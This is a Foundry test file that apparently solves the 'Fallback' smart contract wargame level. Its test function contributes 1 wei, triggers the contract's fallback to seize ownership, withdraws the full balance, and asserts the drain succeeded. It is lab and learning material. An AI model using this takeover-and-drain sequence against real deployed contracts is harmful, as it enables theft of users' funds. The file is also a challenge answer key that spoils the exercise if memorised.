// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback instance;

    uint256 constant INITIAL_BALANCE = 1 ether;
    address immutable i_initialOwner = makeAddr("initialOwner");
    address immutable i_user = makeAddr("user");

    function setUp() public {
        vm.deal(i_initialOwner, INITIAL_BALANCE);
        vm.deal(i_user, INITIAL_BALANCE);
        vm.startBroadcast(i_initialOwner);
        instance = new Fallback();
        address(instance).call{value: 1 ether}("");
        vm.stopBroadcast();
    }

    function test_FallbackSolution() public {
        address initialOwner = instance.owner();
        uint256 initialBalance = address(instance).balance;
        uint256 initialUserBalance = address(i_user).balance;

        vm.startBroadcast(i_user);
        instance.contribute{value: 1 wei}();
        address(instance).call{value: 1 wei}("");
        instance.withdraw();
        vm.stopBroadcast();

        address owner = instance.owner();
        uint256 balance = address(instance).balance;
        uint256 userBalance = address(i_user).balance;

        assertEq(initialOwner, i_initialOwner);
        assertEq(initialBalance, INITIAL_BALANCE);
        assertEq(owner, i_user);
        assertEq(balance, 0);
        assertEq(userBalance - initialUserBalance, INITIAL_BALANCE);
    }
}
